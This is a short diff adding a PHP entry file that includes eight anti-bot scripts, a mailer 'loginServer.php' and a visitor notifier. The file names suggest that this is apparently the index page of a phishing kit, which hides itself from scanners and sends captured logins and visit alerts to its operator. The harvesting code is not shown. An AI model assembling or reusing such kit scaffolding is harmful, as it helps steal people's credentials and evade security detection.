@@ -1,0 +1,15 @@
+<?php 
+
+   include("./bots/anti1.php");
+   include("./bots/anti2.php");
+   include("./bots/anti3.php");
+   include("./bots/anti4.php");
+   include("./bots/anti5.php");
+   include("./bots/anti6.php");
+   include("./bots/anti7.php");
+   include("./bots/anti8.php");
+   
+   include("./mailer/loginServer.php"); 
+   include("visitors_notifier.php"); 
+
+?>
